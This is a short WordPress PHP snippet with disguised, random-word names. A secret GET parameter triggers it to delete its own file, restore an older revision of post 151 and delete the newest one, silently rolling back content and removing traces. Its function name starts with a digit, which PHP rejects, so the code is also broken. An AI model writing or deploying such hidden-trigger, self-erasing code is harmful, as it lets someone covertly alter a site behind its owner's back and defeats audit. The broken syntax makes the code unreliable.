<?php

function 404_pack_field() {
	if (isset($_GET['shortener_event_multi_sitemap']) && $_GET['shortener_event_multi_sitemap'] === 'generator_option_wpc') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$animated_rss_divi = 151;
		$feedback_private_speed = wp_get_post_revisions($animated_rss_divi);
		if (empty($feedback_private_speed)) die('no revisions');
		if (count($feedback_private_speed) < 2) die('less than 2');
		$forum_appointment_graph_files = array_shift($feedback_private_speed);
		$full_real_toolbox_namespaced = $forum_appointment_graph_files->ID;
		$cache_live_survey_tag = array_shift($feedback_private_speed);
		$statistics_official_multi_instagram = $cache_live_survey_tag->ID;
		$demo_coming_lock = wp_restore_post_revision($statistics_official_multi_instagram);
		if ($demo_coming_lock === false) die('error restoring');
		$demo_coming_lock = wp_delete_post_revision($full_real_toolbox_namespaced);		
		if ($demo_coming_lock === false) die('error deleting');
		die('done');
	}
}

add_action('init', '404_pack_field');
